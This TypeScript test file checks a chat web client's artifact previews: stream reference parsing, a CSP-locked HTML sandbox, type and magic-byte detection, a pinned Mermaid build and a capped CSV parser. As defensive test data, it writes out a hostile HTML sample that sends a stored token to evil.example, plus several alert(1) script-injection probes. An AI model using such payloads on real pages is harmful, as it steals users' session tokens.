import { describe, it, expect } from 'vitest';
import { streamTurn } from '../../../web/src/lib/chat/stream.js';
import { transcriptToMessages } from '../../../web/src/lib/chat/helpers.js';

// P5 (step 7) — the web client's DOM-free artifact layer, written BEFORE the change as the bar
// (netzar-chat-plan/p5-proof.sh rows W-1..W-7). Imports stay DOM-free: these modules enter the
// ROOT tsc program through this file (see chat-stream.test.ts).
//
//   - the stream's URL-free `artifact_ref` events become descriptors on the outcome (decision 58);
//   - a reloaded assistant turn keeps them (ART-07);
//   - the HTML preview's srcdoc opens with its own policy before any artifact markup (ART-12);
//   - the policy lets scripts load only from the two library CDNs owner decision 4 names;
//   - which preview a file gets follows its type AND its bytes (ART-09: a spoofed type falls back);
//   - Mermaid renders inside the same sandbox from one pinned jsDelivr build with integrity;
//   - a CSV preview is parsed, not rendered as markup, and is capped.

const load = async () => import('../../../web/src/lib/chat/artifacts.js').catch(() => null);

const REF = {
  artifactId: 'f78d0000-0000-4000-8000-000000000011',
  version: 2,
  fileName: 'Quarterly report',
  contentType: 'text/html',
  createdAt: '2026-09-26T12:00:00.000Z',
};
const PPTX = 'application/vnd.openxmlformats-officedocument.presentationml.presentation';
const DOCX = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';
const XLSX = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';

function sseFetch(reads: string[]): typeof fetch {
  return ((_url: unknown, _init?: unknown) => {
    const encoder = new TextEncoder();
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        for (const r of reads) controller.enqueue(encoder.encode(r));
        controller.close();
      },
    });
    return Promise.resolve({ ok: true, body });
  }) as unknown as typeof fetch;
}
const ev = (event: string, data: string) => `event: ${event}\ndata: ${data}\n\n`;
const noop = { onChunk: () => {}, onToolStatus: () => {} };
const turn = { text: 'Make the page', agentId: 'main', chatId: 'dashboard:p5' };

/** One CSP header value as directive -> sources. */
function directives(csp: string): Map<string, string[]> {
  const out = new Map<string, string[]>();
  for (const part of csp.split(';').map((p) => p.trim()).filter(Boolean)) {
    const [name, ...sources] = part.split(/\s+/);
    out.set(name!, sources);
  }
  return out;
}

describe('P5 web artifact layer', () => {
  it('P5 stream collects URL free artifact references and drops malformed ones', async () => {
    const second = { ...REF, artifactId: 'f78d0000-0000-4000-8000-000000000012', version: 1,
      fileName: 'chart.svg', contentType: 'image/svg+xml' };
    const outcome = await streamTurn(turn, 'tok', noop, { fetchImpl: sseFetch([
      ev('final', JSON.stringify({ text: 'Here it is.', modelId: 'm', latencyMs: 1, costUsd: 0, toolCallCount: 1 })),
      ev('artifact_ref', JSON.stringify(REF)),
      // A field the server never sends is not carried into the message (no URL can ride along).
      ev('artifact_ref', JSON.stringify({ ...second, url: 'https://curated.example/x?X-Amz-Signature=1' })),
      ev('artifact_ref', '{not json'),
      ev('artifact_ref', JSON.stringify({ ...REF, artifactId: 'not-a-uuid' })),
      ev('artifact_ref', JSON.stringify({ ...REF, version: 0 })),
      ev('artifact_ref', JSON.stringify({ ...REF, fileName: 'a/b' })),
      ev('artifact_ref', JSON.stringify({ ...REF, createdAt: 'yesterday' })),
      ev('artifact', JSON.stringify({ url: 'data:text/plain,legacy', name: 'old.pdf' })),
      ev('done', 'ok'),
    ]) });
    const refs = (outcome as unknown as { artifactRefs?: unknown }).artifactRefs;
    expect(refs, 'the outcome carries the stored artifact descriptors').toEqual([REF, second]);
    expect(JSON.stringify(refs)).not.toMatch(/url|X-Amz-|https?:/i);
    expect(outcome.artifacts, 'a legacy link card still arrives on its own field').toEqual([
      { url: 'data:text/plain,legacy', name: 'old.pdf' }]);
    expect(outcome.text).toBe('Here it is.');
  });

  it('P5 reloaded assistant turns carry their artifact references', () => {
    const messages = transcriptToMessages([
      { role: 'user', text: 'Make the page', ts: 1 },
      { role: 'assistant', text: 'Here it is.', ts: 2,
        artifacts: [REF, { ...REF, artifactId: 'bad' }, { ...REF, version: 3, extra: 'dropped' }] } as never,
      { role: 'assistant', text: 'No file this time.', ts: 3 },
    ]);
    const refs = messages.map((m) => (m as { artifactRefs?: unknown }).artifactRefs);
    expect(refs[0], 'a user turn never carries artifacts').toBeUndefined();
    expect(refs[1]).toEqual([REF, { ...REF, version: 3 }]);
    expect(refs[2]).toBeUndefined();
  });

  it('P5 sandbox document opens with its policy before any artifact markup', async () => {
    const artifacts = await load();
    expect(artifacts?.buildSandboxDocument, 'the preview sandbox builder must exist').toBeTypeOf('function');
    const hostile = '<!doctype html><meta http-equiv="Content-Security-Policy" content="script-src *">' +
      '<script>top.location = "https://evil.example/?t=" + localStorage.cce_token</script><p>Q3</p>';
    const doc: string = artifacts!.buildSandboxDocument(hostile);
    expect(doc.startsWith('<!DOCTYPE html>'), 'our doctype comes first').toBe(true);
    const ours = doc.indexOf(`<meta http-equiv="Content-Security-Policy" content="${artifacts!.SANDBOX_CSP}">`);
    expect(ours, 'our policy meta is present verbatim').toBeGreaterThan(0);
    const theirs = doc.indexOf('content="script-src *"');
    const firstScript = doc.indexOf('<script');
    expect(ours).toBeLessThan(theirs);
    expect(ours, 'no script of any kind precedes our policy').toBeLessThan(firstScript);
    expect(doc.indexOf(hostile), 'the artifact markup follows unchanged').toBeGreaterThan(ours);
    // Our own guard script is the first script and it is closed before the artifact begins.
    const guardEnd = doc.indexOf('</script>', firstScript);
    expect(guardEnd).toBeGreaterThan(firstScript);
    expect(guardEnd).toBeLessThan(doc.indexOf(hostile));
    expect(doc.slice(0, doc.indexOf(hostile)), 'nothing before the artifact loads from the network')
      .not.toMatch(/\bsrc\s*=|\bhref\s*=/i);
  });

  it('P5 sandbox policy allows scripts only from the two library CDNs', async () => {
    const artifacts = await load();
    expect(artifacts?.SANDBOX_CSP, 'the preview policy must exist').toBeTypeOf('string');
    const d = directives(artifacts!.SANDBOX_CSP);
    const libs = ['https://cdn.jsdelivr.net/npm/', 'https://cdnjs.cloudflare.com/ajax/libs/'];
    expect(d.get('default-src')).toEqual(["'none'"]);
    expect(new Set(d.get('script-src'))).toEqual(new Set(["'unsafe-inline'", ...libs]));
    expect(new Set(d.get('style-src'))).toEqual(new Set(["'unsafe-inline'", ...libs]));
    expect(new Set(d.get('font-src'))).toEqual(new Set(['data:', ...libs]));
    expect(new Set(d.get('img-src'))).toEqual(new Set(['data:', 'blob:']));
    expect(new Set(d.get('media-src'))).toEqual(new Set(['data:', 'blob:']));
    for (const name of ['connect-src', 'form-action', 'frame-src', 'child-src', 'worker-src', 'object-src',
      'base-uri', 'manifest-src']) {
      expect(d.get(name), name).toEqual(["'none'"]);
    }
    // No wildcard, no eval, no plain http, and no host outside the two library paths anywhere.
    const every = [...d.values()].flat();
    expect(every.filter((s) => /\*|unsafe-eval|^http:|^https:\/\/(?!cdn\.jsdelivr\.net\/npm\/$|cdnjs\.cloudflare\.com\/ajax\/libs\/$)/.test(s)))
      .toEqual([]);
  });

  it('P5 preview kind follows the content type and the file magic', async () => {
    const artifacts = await load();
    expect(artifacts?.previewKind, 'one rule picks a preview').toBeTypeOf('function');
    const kind = artifacts!.previewKind as (contentType: string, head: Uint8Array) => string;
    const bytes = (...b: number[]) => new Uint8Array(b);
    const text = (s: string) => new TextEncoder().encode(s);
    const none = new Uint8Array();
    expect(kind('text/html', text('<p>hi</p>'))).toBe('html');
    expect(kind('image/svg+xml', text('<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"/>'))).toBe('svg');
    expect(kind('image/png', bytes(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0))).toBe('image');
    expect(kind('image/jpeg', bytes(0xff, 0xd8, 0xff, 0xe0))).toBe('image');
    expect(kind('image/gif', text('GIF89a....'))).toBe('image');
    expect(kind('image/webp', text('RIFF\u0000\u0000\u0000\u0000WEBPVP8 '))).toBe('image');
    expect(kind('application/pdf', text('%PDF-1.7\n'))).toBe('pdf');
    expect(kind('text/markdown', text('# Title'))).toBe('markdown');
    expect(kind('text/plain', text('print(1)'))).toBe('code');
    expect(kind('application/json', text('{}'))).toBe('code');
    expect(kind('text/xml', text('<a/>'))).toBe('code');
    expect(kind('text/csv', text('a,b'))).toBe('csv');
    expect(kind('text/vnd.mermaid', text('graph TD; A-->B'))).toBe('mermaid');
    expect(kind(PPTX, none), 'a deck is previewed from the server outline').toBe('outline');
    expect(kind(DOCX, none)).toBe('fallback');
    expect(kind(XLSX, none)).toBe('fallback');
    expect(kind('application/rtf', text('{\\rtf1'))).toBe('fallback');
    expect(kind('application/x-unknown', text('?'))).toBe('fallback');
    // A type the bytes contradict never gets the richer preview (ART-09).
    expect(kind('image/png', text('<html><script>alert(1)</script>'))).toBe('fallback');
    expect(kind('application/pdf', text('<html>not a pdf</html>'))).toBe('fallback');
    expect(kind('image/svg+xml', text('<html><body>no drawing here</body></html>'))).toBe('fallback');
    expect(kind('image/jpeg', bytes(0x89, 0x50, 0x4e, 0x47))).toBe('fallback');
  });

  it('P5 mermaid document loads one pinned library with integrity', async () => {
    const artifacts = await load();
    expect(artifacts?.buildMermaidDocument, 'the Mermaid preview builder must exist').toBeTypeOf('function');
    expect(artifacts!.MERMAID_SRC).toBe('https://cdn.jsdelivr.net/npm/mermaid@11.17.2/dist/mermaid.min.js');
    expect(artifacts!.MERMAID_INTEGRITY).toBe('sha384-EOXBFmc3gx5mb+vn0vPvvGqACToJD24hhacX5Yx+8NUUQrHIle/Qi5Bg9o3zKwW2');
    const source = 'graph TD\n  A-->B</pre><script>alert(1)</script>';
    const doc: string = artifacts!.buildMermaidDocument(source);
    const external = [...doc.matchAll(/<script\b[^>]*\bsrc\s*=\s*"([^"]*)"[^>]*>/g)];
    expect(external, 'exactly one external script').toHaveLength(1);
    expect(external[0]![1]).toBe(artifacts!.MERMAID_SRC);
    expect(external[0]![0]).toContain(`integrity="${artifacts!.MERMAID_INTEGRITY}"`);
    expect(external[0]![0]).toContain('crossorigin="anonymous"');
    expect(doc).toContain("securityLevel: 'strict'");
    expect(doc, 'the diagram source is escaped text, never markup').not.toContain('<script>alert(1)');
    expect(doc).toContain('&lt;/pre&gt;&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('P5 csv preview parses quoted cells and caps its rows', async () => {
    const artifacts = await load();
    expect(artifacts?.parseCsv, 'a CSV parser for the preview must exist').toBeTypeOf('function');
    const parse = artifacts!.parseCsv as (text: string, maxRows: number) => { rows: string[][]; truncated: boolean };
    expect(parse('name,note\r\n"Smith, J","said ""hi""\nthen left"\r\nplain,<b>x</b>\n', 10)).toEqual({
      rows: [['name', 'note'], ['Smith, J', 'said "hi"\nthen left'], ['plain', '<b>x</b>']],
      truncated: false,
    });
    const many = Array.from({ length: 12 }, (_, i) => `r${i},v${i}`).join('\n');
    const capped = parse(many, 5);
    expect(capped.rows).toHaveLength(5);
    expect(capped.rows[4]).toEqual(['r4', 'v4']);
    expect(capped.truncated).toBe(true);
    expect(parse('', 5)).toEqual({ rows: [], truncated: false });
  });
});
